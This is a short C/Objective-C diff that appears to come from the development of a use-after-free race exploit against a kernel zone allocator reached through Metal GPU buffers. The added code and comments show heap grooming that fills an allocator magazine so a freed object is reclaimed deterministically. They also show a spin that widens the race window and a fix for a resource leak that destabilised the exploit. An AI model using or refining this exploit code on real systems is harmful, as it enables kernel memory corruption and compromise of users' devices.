@@ -86,7 +86,7 @@ static p017_gettype_t  p017_gettype_fn = NULL;
 #define P017_MAG_CAP            A14_23F77_ZONE_MAGAZINE_CAP
 #define P017_RECLAIM_SPIN       500
 #define P017_A_SPIN             750 /* FIX16: A's spin to widen fn4 window */
-#define P017_BUILD              "p017v2-fix16-stabilized-magazine"
+#define P017_BUILD              "p017v2-fix17-lifo-swap-top"
 #ifndef THREAD_AFFINITY_POLICY_COUNT
 #define THREAD_AFFINITY_POLICY_COUNT 1
 #endif
@@ -464,9 +464,14 @@ static void *p017_thread_b(void *arg) {
     id<MTLBuffer> held = nil;
 
     while (!p017_stop) {
-        /* 0. STABILIZED PRE-POSITION: 5 create+drop to fill free to 5
-              This is more conservative than 7, less magazine disturbance */
-        for (int i = 0; i < 5; i++) {
+        /* 0. RECLAIM-TOPOLOGY FIX (fix17): pre-position = MAG_CAP-1 create+drop.
+              Magazine = two halves, LIFO, SWAP at cap (8). fix16's 5 left the
+              free half at 6/8 after zfree(P) — P never crossed to the alloc
+              half, so the 1-syscall pop could NEVER pop P ("P stayed on free
+              half" locked finding). With cap-1 pre-position, P's zfree push is
+              the 8th = the SWAP trigger → P = LIFO TOP of the new alloc half
+              → the next create pops P deterministically. */
+        for (int i = 0; i < (int)P017_MAG_CAP - 1; i++) {
             uint32_t sid = 0;
             id<MTLBuffer> tmp = p017_create_resource(&sid, 0);
             if (tmp) {
@@ -491,6 +496,14 @@ static void *p017_thread_b(void *arg) {
         /* 3. Spin — let A's taggedRetain hit reclaimed P. */
         for (volatile int i = 0; i < P017_RECLAIM_SPIN; i++) {
             __asm__ __volatile__("" ::: "memory");
+        }
+
+        /* FIX17: release the held resource EVERY iteration. fix16 reassigned
+              `held` without dropping — one leaked GMD per iteration, unbounded
+              drift of the magazine state ("held" only dropped after loop). */
+        if (held) {
+            p017_drop_resource(&held);
+            held = nil;
         }
 
         if ((local_iter & P017_ITER_FLUSH_MASK) == 0) {
